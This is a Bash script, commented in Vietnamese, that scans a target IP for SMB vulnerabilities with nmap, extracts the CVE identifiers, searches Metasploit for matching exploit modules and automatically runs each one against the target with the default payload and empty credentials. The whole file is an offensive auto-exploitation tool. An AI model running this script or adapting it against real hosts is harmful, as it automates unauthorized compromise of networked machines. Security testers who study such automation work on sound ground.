#!/bin/bash

# Màu
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
NC='\033[0m'

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

echo -e "${YELLOW}[*] Quét SMB và tự động khai thác nếu có thể...${NC}"

# 1. Quét SMB vuln bằng Nmap
echo -e "${GREEN}[*] Đang quét lỗ hổng SMB trên $TARGET...${NC}"
nmap -p 139,445 --script smb-vuln* $TARGET -oN smb_scan.txt

# 2. Trích xuất CVE
grep -Eo "CVE-[0-9]{4}-[0-9]{4,7}" smb_scan.txt | sort -u > smb_cve.txt
if [ ! -s smb_cve.txt ]; then
    echo -e "${YELLOW}[!] Không tìm thấy CVE SMB nào trên $TARGET${NC}"
    exit 0
fi

# 3. Duyệt từng CVE và tìm module khai thác
while read CVE; do
    echo -e "\n${GREEN}[+] Kiểm tra CVE: $CVE${NC}"
    MODULES=$(msfconsole -q -x "search $CVE; exit" | grep exploit | awk '{print $2}')

    if [ -n "$MODULES" ]; then
        echo -e "${RED}[CRITICAL] Tìm thấy module Metasploit: ${MODULES}${NC}"
        echo -e "${YELLOW}[*] Tự động khai thác...${NC}"

        # 4. Chạy exploit với Metasploit (payload mặc định)
        msfconsole -q -x "
            use $MODULES;
            set RHOSTS $TARGET;
            set SMBUser '';
            set SMBPass '';
            set LHOST 0.0.0.0;
            run;
            exit;
        "
    else
        echo -e "${YELLOW}[!] Không có module Metasploit cho $CVE${NC}"
    fi
done < smb_cve.txt
